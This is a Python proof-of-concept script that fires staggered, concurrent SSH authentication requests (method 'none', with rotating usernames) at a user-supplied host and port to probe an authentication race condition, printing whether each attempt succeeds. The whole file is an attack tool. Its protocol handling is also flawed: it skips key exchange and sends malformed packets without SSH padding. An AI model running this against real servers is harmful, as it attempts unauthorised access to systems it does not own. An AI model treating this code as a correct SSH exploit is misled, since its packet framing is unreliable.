#!/usr/bin/env python3
import socket
import struct
import threading
import time
import sys

# SSH Message Types
SSH_MSG_USERAUTH_REQUEST = 50
SSH_MSG_USERAUTH_FAILURE = 51
SSH_MSG_USERAUTH_SUCCESS = 52
SSH_MSG_DISCONNECT = 1

def pack_ssh_string(data):
    """Packs data into an SSH string format (length + data)."""
    if isinstance(data, str):
        data = data.encode('utf-8')
    return struct.pack('>I', len(data)) + data

def craft_userauth_request(username, service, method):
    """Crafts an SSH_MSG_USERAUTH_REQUEST message."""
    msg = struct.pack('B', SSH_MSG_USERAUTH_REQUEST)
    msg += pack_ssh_string(username)
    msg += pack_ssh_string(service)
    msg += pack_ssh_string(method)
    return msg

def send_packet(sock, payload):
    """Sends an SSH packet with proper length prefix."""
    packet = struct.pack('>I', len(payload)) + payload
    sock.sendall(packet)

def receive_packet(sock):
    """Receives an SSH packet."""
    try:
        length_data = sock.recv(4)
        if not length_data:
            return None
        length = struct.unpack('>I', length_data)[0]
        payload = b''
        while len(payload) < length:
            chunk = sock.recv(length - len(payload))
            if not chunk:
                break
            payload += chunk
        return payload
    except socket.timeout:
        return None

def ssh_client_thread(target_ip, target_port, username, service, method, delay=0):
    """Simulates an SSH client sending authentication requests."""
    time.sleep(delay)
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((target_ip, target_port))
            
            # Send SSH identification string
            s.sendall(b'SSH-2.0-PoC\r\n')
            banner = s.recv(256)
            print(f"[Thread {username}] Received banner: {banner.decode().strip()}")
            
            # Send authentication request
            auth_req = craft_userauth_request(username, service, method)
            send_packet(s, auth_req)
            print(f"[Thread {username}] Sent auth request for user: {username}")
            
            # Receive response
            response = receive_packet(s)
            if response:
                msg_type = response[0]
                if msg_type == SSH_MSG_USERAUTH_SUCCESS:
                    print(f"[Thread {username}] SUCCESS: Authentication accepted!")
                elif msg_type == SSH_MSG_USERAUTH_FAILURE:
                    print(f"[Thread {username}] FAILURE: Authentication rejected.")
                elif msg_type == SSH_MSG_DISCONNECT:
                    print(f"[Thread {username}] DISCONNECT: Server closed connection.")
                else:
                    print(f"[Thread {username}] Unexpected message type: {msg_type}")
            else:
                print(f"[Thread {username}] No response received.")
    except Exception as e:
        print(f"[Thread {username}] Error: {e}")

def main():
    if len(sys.argv) != 3:
        print("Usage: python poc_authentication_state_flush_race.py <target_ip> <target_port>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    
    print(f"Starting race condition test against {target_ip}:{target_port}")
    
    # Create threads to send rapid authentication requests with changing usernames
    threads = []
    usernames = ["user1", "user2", "user3", "user4", "user5"]
    
    for i, username in enumerate(usernames):
        # Stagger requests slightly to simulate rapid concurrent access
        delay = i * 0.01  # 10ms delay between each request
        t = threading.Thread(target=ssh_client_thread, args=(target_ip, target_port, username, "ssh-connection", "none", delay))
        threads.append(t)
    
    # Start all threads
    for t in threads:
        t.start()
    
    # Wait for all threads to complete
    for t in threads:
        t.join()
    
    print("Race condition test completed.")

if __name__ == "__main__":
    main()